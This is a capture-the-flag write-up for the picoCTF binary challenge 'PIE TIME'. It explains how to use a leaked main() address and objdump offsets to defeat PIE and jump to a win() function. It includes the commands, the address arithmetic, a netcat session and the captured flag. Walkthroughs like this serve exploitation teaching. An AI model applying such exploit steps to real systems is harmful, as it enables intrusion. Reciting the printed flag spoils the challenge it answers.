---
description: 'Author: Darkraicg492'
---

# PIE TIME

***

### Step 1: Reconnaissance

First things first, let’s check the binary protections:

```
└─$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   78 Symbols        No    0               1               vuln
```

Notice that **PIE is enabled**.\
This means the program’s memory layout will change on each execution — so we can’t just guess function addresses, they’ll slide around every time.

If you’re new to PIE, I recommend giving this a quick read:\
👉 [Ir0nstone’s notes on PIE](https://ir0nstone.gitbook.io/notes/binexp/stack/pie)

***

### Step 2: Looking at the Source Code

The challenge kindly provides the source code. Here are the important parts:

```c
int win() {
    FILE *fptr;
    char c;

    printf("You won!\n");
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL) {
        printf("Cannot open file.\n");
        exit(0);
    }

    c = fgetc(fptr);
    while (c != EOF) {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    printf("\n");
    fclose(fptr);
}

int main() {
    signal(SIGSEGV, segfault_handler);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("Address of main: %p\n", &main); // Leaks main's address

    unsigned long val;
    printf("Enter the address to jump to, ex => 0x12345: ");
    scanf("%lx", &val);

    void (*foo)(void) = (void (*)())val;
    foo(); // Jump!
}
```

#### Key Observations

* The program literally asks for an address and jumps to it.
* The `win()` function prints the flag, but we need its address.
* Since PIE is enabled, addresses change per run.
* Luckily, the program **prints main’s address** each time. That’s our reference point.

***

### 🤔 Strategy

We can use the leaked `main()` address to calculate where `win()` lives.

#### Formula:

```
base = main_address - main_offset
win_address = base + win_offset
```

***

### Step 3: Finding Offsets

Let’s disassemble with objdump:

```
└─$ objdump -d vuln | grep ">:"
00000000000012a7 <win>:
000000000000133d <main>:
```

* `win_offset = 0x12a7`
* `main_offset = 0x133d`

***

### Step 4: Calculating the Address

Suppose the program gives us:

```
Address of main: 0x558860d7633d
```

We calculate `win` like this (using Python because… yeah, hex math in head is pain):

```python
>>> hex((0x558860d7633d - 0x133d) + 0x12a7)
'0x558860d762a7'
```

That’s our target address for `win()`.

***

### Step 5: Exploitation

Let’s test it:

```
└─$ nc rescued-float.picoctf.net 54799
Address of main: 0x609e7137533d
Enter the address to jump to, ex => 0x12345: 0x609e713752a7
Your input: 609e713752a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_28a46dcd}
```

Flag captured ✅

***

### 🔑 Key Takeaways

* **PIE** (Position Independent Executable) randomizes addresses each run.
* Leaked addresses (like `main`) can be used as a reference.
* Subtract offset → get base → add target offset → jump to the correct function.
* Some challenges are as straightforward as “just give me the right function address.”

✨ PIE may shuffle the deck, but math always wins. ✨
